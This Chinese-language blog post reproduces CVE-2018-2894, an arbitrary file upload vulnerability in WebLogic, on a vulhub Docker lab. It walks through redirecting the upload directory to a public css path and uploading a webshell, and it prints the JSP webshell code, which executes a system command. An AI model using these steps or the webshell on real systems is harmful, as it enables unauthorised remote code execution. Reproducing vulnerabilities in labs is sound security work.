---
layout: post
title: WebLogic 任意文件上传漏洞
tags: WebLogic
categories: CVE-2018-2894
---

# Weblogic 任意文件上传漏洞（CVE-2018-2894）

## 漏洞描述

WebLogic管理端存在两个未授权访问的页面分别为/ws_utc/begin.do，/ws_utc/config.do；在开发模式下无需认证，在生产模式下需要认证；这两个页面存在任意文件上传漏洞，可直接getshell获取权限。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930741931274.jpg)

执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930742685871.jpg)

登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项（Web Service Test Page 在“生产模式”下默认不开启）：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930746421055.jpg)

访问`http://your-ip:7001/ws_utc/config.do`，设置Work Home Dir为 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要（默认为/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir，这个目录访问需要权限，直接访问回跳转到登录页面）。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930756044443.jpg)

然后点击安全 -> 添加，然后上传webshell：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930760344894.jpg)

点击提交，查看返回数据包中有时间戳

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930761828033.jpg)

然后访问`http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`（上传的文件保存文件名为`时间戳 + "_" + filename`），即可执行webshell：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2894/15930774498106.jpg)

### shell.jsp

```
<%@ page contentType="text/html; charset=UTF-8"
language="java"
buffer="32kb"
import="java.lang.Runtime,java.io.*"
%>
<%
Runtime r = java.lang.Runtime.getRuntime();
String command = "id";
try
{
Process p = r.exec(command);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()),1024);
while (br.read()!=-1)
{
out.print(br.readLine());
}
br.close();

}catch(IOException e)
{
e.printStackTrace();
}
%>
```

## 受影响的版本

10.3.6.0
12.1.3.0
12.2.1.2
12.2.1.3

## 参考链接

https://blog.csdn.net/oracle_microsoft/article/details/2219909